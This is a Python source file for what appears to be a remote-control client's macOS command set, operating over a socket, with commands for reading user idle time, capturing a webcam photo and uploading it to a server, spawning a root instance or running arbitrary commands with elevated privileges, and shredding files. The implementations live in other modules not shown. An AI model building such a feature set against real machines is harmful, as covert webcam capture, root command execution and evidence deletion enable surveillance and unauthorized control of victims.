from client.commands.runtime.interrupts import timeout
from client.commands.platform.services.mac.automation_service import MacAutomationService
from client.commands.platform.services.mac.file_inspection_service import MacFileInspectionService
from client.commands.platform.services.mac.media_service import MacMediaService
from client.commands.platform.services.mac.system_service import MacSystemService
from client.commands.shell.decorators import shell_command
from core.utils.decorator import confirm


class MacShellCommands:
    """macOS Shell commands."""

    def __init__(self, socket):
        super().__init__(socket)
        self.mac_system = MacSystemService(self)
        self.mac_media = MacMediaService(self)
        self.mac_automation = MacAutomationService(self)
        self.mac_file_inspection = MacFileInspectionService(self)

    @shell_command('Show user idle time', group='system')
    def idletime(self):
        return self.mac_system.get_idle_time()

    @shell_command('Capture webcam photo', group='media', output='stream')
    def webcam_snap(self):
        """拍照并上传到服务器"""
        return self.mac_media.capture_webcam_photo()

    @shell_command('Launch a new instance with elevated privileges', group='privilege')
    @timeout(150)
    @confirm('This may show an operating system permission prompt and wait for authorization. Continue?')
    def spawn_elevated_instance(self, options=''):
        """以 root 权限启动新实例，返回 PID"""
        option = options.strip()
        if option not in ('', '--detached'):
            return 0, 'Usage: spawn_elevated_instance [--detached] [--no-confirm]'
        return self.mac_automation.sudo_self(detached=(option == '--detached'))

    @shell_command('Run a command with elevated privileges', group='privilege')
    @confirm('This may show an operating system permission prompt and wait for authorization. Continue?')
    def run_elevated(self, command):
        """以 root 权限执行命令 (macOS)"""
        return self.mac_automation.sudo_run(command)

    @shell_command('Securely delete file (overwrite)', group='file', output='stream')
    def file_shred(self, path):
        """安全删除文件（覆写后删除）"""
        return self.mac_file_inspection.secure_delete_file(path)
